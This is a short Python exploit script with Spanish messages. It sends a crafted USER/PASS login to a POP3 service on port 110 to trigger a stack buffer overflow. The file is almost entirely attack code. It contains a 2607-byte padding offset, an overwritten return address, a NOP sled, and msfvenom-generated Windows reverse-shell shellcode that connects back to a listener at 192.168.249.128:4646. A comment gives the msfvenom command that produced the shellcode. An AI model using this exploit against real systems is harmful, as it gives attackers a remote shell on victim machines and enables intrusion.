from pwn import *
from struct import pack
import socket, sys

if len(sys.argv) < 2:
    print ("Uso python" + sys.argv[0] + "<ip-address>\n")

ip_address = sys.argv[1]
rport = 110

if __name__ == '__main__':


     # msfvenom -p windows/shell_reverse_tcp LHOST=192.168.249.128 EXITFUNC=thread LPORT=4646 -a x86 --platform windows -b "\x00\x0a\x0d" -e x86/shikata_ga_nai -f c
    shell_code = (b"\xbf\x2c\xab\xbb\x0f\xda\xc9\xd9\x74\x24\xf4\x5a\x2b\xc9\xb1"
b"\x52\x31\x7a\x12\x83\xc2\x04\x03\x56\xa5\x59\xfa\x5a\x51\x1f"
b"\x05\xa2\xa2\x40\x8f\x47\x93\x40\xeb\x0c\x84\x70\x7f\x40\x29"
b"\xfa\x2d\x70\xba\x8e\xf9\x77\x0b\x24\xdc\xb6\x8c\x15\x1c\xd9"
b"\x0e\x64\x71\x39\x2e\xa7\x84\x38\x77\xda\x65\x68\x20\x90\xd8"
b"\x9c\x45\xec\xe0\x17\x15\xe0\x60\xc4\xee\x03\x40\x5b\x64\x5a"
b"\x42\x5a\xa9\xd6\xcb\x44\xae\xd3\x82\xff\x04\xaf\x14\x29\x55"
b"\x50\xba\x14\x59\xa3\xc2\x51\x5e\x5c\xb1\xab\x9c\xe1\xc2\x68"
b"\xde\x3d\x46\x6a\x78\xb5\xf0\x56\x78\x1a\x66\x1d\x76\xd7\xec"
b"\x79\x9b\xe6\x21\xf2\xa7\x63\xc4\xd4\x21\x37\xe3\xf0\x6a\xe3"
b"\x8a\xa1\xd6\x42\xb2\xb1\xb8\x3b\x16\xba\x55\x2f\x2b\xe1\x31"
b"\x9c\x06\x19\xc2\x8a\x11\x6a\xf0\x15\x8a\xe4\xb8\xde\x14\xf3"
b"\xbf\xf4\xe1\x6b\x3e\xf7\x11\xa2\x85\xa3\x41\xdc\x2c\xcc\x09"
b"\x1c\xd0\x19\x9d\x4c\x7e\xf2\x5e\x3c\x3e\xa2\x36\x56\xb1\x9d"
b"\x27\x59\x1b\xb6\xc2\xa0\xcc\x79\xba\x53\x8c\x12\xb9\xa3\x9f"
b"\xc4\x34\x45\xf5\x18\x11\xde\x62\x80\x38\x94\x13\x4d\x97\xd1"
b"\x14\xc5\x14\x26\xda\x2e\x50\x34\x8b\xde\x2f\x66\x1a\xe0\x85"
b"\x0e\xc0\x73\x42\xce\x8f\x6f\xdd\x99\xd8\x5e\x14\x4f\xf5\xf9"
b"\x8e\x6d\x04\x9f\xe9\x35\xd3\x5c\xf7\xb4\x96\xd9\xd3\xa6\x6e"
b"\xe1\x5f\x92\x3e\xb4\x09\x4c\xf9\x6e\xf8\x26\x53\xdc\x52\xae"
b"\x22\x2e\x65\xa8\x2a\x7b\x13\x54\x9a\xd2\x62\x6b\x13\xb3\x62"
b"\x14\x49\x23\x8c\xcf\xc9\x43\x6f\xc5\x27\xec\x36\x8c\x85\x71"
b"\xc9\x7b\xc9\x8f\x4a\x89\xb2\x6b\x52\xf8\xb7\x30\xd4\x11\xca"
b"\x29\xb1\x15\x79\x49\x90")
    
    offset = b"A"*2607
    eip = b"\x8f\x35\x4a\x5f" #0x5f4a358f
    buffer = offset + eip  + b"\x90"*16 + shell_code    
   
    user = b"USER usuario\r\n"
    password = b"PASS" +  buffer + b"\r\n"

    
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ip_address, rport))
        s.recv(1024)

        s.send(user)
        s.recv(1024)
        
        s.send(password)
        s.recv(1024)

        s.close()
    

    except:
        print("\n[!] Se ha producido un error")
        sys.exit(1)


